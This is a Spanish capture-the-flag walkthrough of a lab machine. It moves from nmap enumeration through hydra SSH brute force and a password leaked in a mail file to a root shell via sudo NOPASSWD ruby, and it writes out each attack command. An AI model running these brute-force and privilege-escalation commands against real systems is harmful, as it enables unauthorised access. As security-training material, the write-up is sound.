
## Escaneo de Puertos

```bash
nmap -sVC -p- --open 172.17.0.2
``` 
Listamos con nmap los siguientes puertos:
```bash
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-12 16:32 +0200
Nmap scan report for 172.17.0.2
Host is up (0.00s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 41:16:eb:54:64:34:d1:69:ee:dc:d9:21:9c:72:a5:c1 (RSA)
|   256 f0:c4:2b:02:50:3a:49:a7:a2:34:b8:09:61:fd:2c:6d (ECDSA)
|_  256 df:e9:46:31:9a:ef:0d:81:31:1f:77:e4:29:f5:c9:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: E6:2A:3B:08:24:C9 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.29 seconds
```

## Análisis de puerto 80

Si entramos a la web de primeras no veremos nada mas que una pantalla en blanco... Pero vamos a hacer un curl para ver un output mas detallado y valido.
```
curl http://172.17.0.2   
<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
```

De buenas a primeras esta información seria un poco "**irrelevante**" ¿No?.
En este caso contamos con el puerto **22**, el cual tiene el servicio **ssh** como de costumbre, con estos 2 nombres podemos probar un ataque de fuerza bruta para ver si podemos acceder a ellos, siempre que ese supuesto usuario exista.

## Ataque al puerto 22

Como vemos, Juan ha dejado un correo importante a Camilo, esto nos da 2 pistas:
1. Dos presuntos usuarios
2. Camilo sabe algo que nos interesa porque es "**importante**"

Vamos a empezar haciendo fuerza bruta al usuarios Camilo, ya que de los 2 es el mas tentador.
```bash
hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4 -F 
```

Usamos **hydra** para indicar que queremos usar el login de camilo a través del servicio ssh **por** la IP **172.17.0.2** con **"-t 4"** (Importante por los **rate limit** que pone **ssh**) y usamos el mítico diccionario **Rockyou.txt**.
```bash
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-12 16:42:54
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: camilo   password: --------
[STATUS] attack finished for 172.17.0.2 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-12 16:42:55
```

## Intrusión al usuario Camilo

Con Hydra hemos conseguido extraer la contraseña que Camilo tiene en SSH, por lo que vamos a acceder a el usando el siguiente comando: 
```bash
ssh camilo@172.17.0.2
```

Una vez dentro, tenemos que sanitizar el TTY, aquí veréis que se suele usar para estos casos:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```
"Esto suele hacerse siempre que conseguimos una **Shell**, aunque hay excepciones"

Primero que nada, veremos si podemos conseguir acceso a sudo usando el comando **sudo -l**:
```bash
camilo@09f0c75ce21a:/var/mail/camilo$ sudo -l 
[sudo] password for camilo: 
Sorry, user camilo may not run sudo on 09f0c75ce21a.
```
Vemos que no, por lo que vamos a seguir investigando dentro de Camilo a ver que conseguimos.

Una vez dentro, vamos a buscar el correo que le envió Juan, por lo general esto suele almacenarse en **/var/mail**:
```bash
camilo@09f0c75ce21a:/var/mail$ cd /var/mail
camilo@09f0c75ce21a:/var/mail$ ls
camilo
```

Accederemos al directorio de camilo y veremos que es lo que le envía Juan:
```bash
camilo@09f0c75ce21a:/var/mail/camilo$ cat correo.txt 
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2***dicb
```

En efecto, juan le ha adjuntado a Camilo su contraseña en este archivo, asi que ahora nos toca acceder a Juan, para ver que podemos sacar de ahí.

## Intrusión al usuario Juan

Desde dentro de Camilo usaremos el siguiente comando para conectarnos a Juan y volver a sanitizar el TTY:
```bash
su juan
```

Una vez dentro y con todo listo vamos a volver a probar sudo -l:
```bash
juan@09f0c75ce21a:/var/mail/camilo$ sudo -l
Matching Defaults entries for juan on 09f0c75ce21a:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User juan may run the following commands on 09f0c75ce21a:
    (ALL) NOPASSWD: /usr/bin/ruby
juan@09f0c75ce21a:/var/mail/camilo$ 
```

Aquí ya vemos algo que nos interesa mas que es **/usr/bin/ruby**, significa que Juan puede ejecutar Ruby como cualquier usuario sin necesidad de una contraseña **"(ALL) NOPASSWD"**.

Nuestro objetivo es abusar de este permiso para que consigamos una Shell como root y lo haremos con el siguiente comando:
```bash
sudo /usr/bin/ruby -e 'exec "/bin/bash"'
```

con -e indicamos a Ruby que empiece una línea de código y con '  **exec "/bin/bash" '**  reemplaza el espacio de memoria del proceso Ruby por el proceso **/bin/bash** que se ejecuta desde sudo, haciendo que consigamos una **Shell** como **root**.

## Obtención de root

```
juan@09f0c75ce21a:/var/mail/camilo$ sudo /usr/bin/ruby -e 'exec "/bin/bash"'
root@09f0c75ce21a:/var/mail/camilo# whoami
root
root@09f0c75ce21a:/var/mail/camilo# id
uid=0(root) gid=0(root) groups=0(root)
root@09f0c75ce21a:/var/mail/camilo# uname -a
Linux 09f0c75ce21a 6.19.11+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.19.11-1kali1 (2026-04-09) x86_64 x86_64 x86_64 GNU/Linux
root@09f0c75ce21a:/var/mail/camilo# 
```

Una vez hecho esto, completamos la maquina consiguiendo el mas alto privilegio en el sistema.

## Conclusión del ataque:

#### *Resumen de la ruta de ataque*

La máquina se ha comprometido completamente siguiendo una cadena de explotación que combina técnicas de enumeración, fuerza bruta y abuso de configuraciones erróneas. El recorrido ha sido el siguiente:

1. **Enumeración inicial** → Descubrimiento de los puertos 22 (SSH) y 80 (HTTP)
    
2. **Fuga de información** → Curl revela un mensaje sobre un correo entre Juan y Camilo
    
3. **Fuerza bruta a SSH** → Hydra encuentra la contraseña --------- para el usuario `camilo`
    
4. **Acceso inicial** → Shell como `camilo` mediante SSH
    
5. **Movimiento lateral** → Extracción de la contraseña de Juan desde `/var/mail/camilo/correo.txt` (clave: `2***dicb`)
    
6. **Escalada de privilegios** → Abuso de `sudo` con Ruby (`NOPASSWD: /usr/bin/ruby`) para ejecutar `exec "/bin/bash"` y obtener una shell como `root`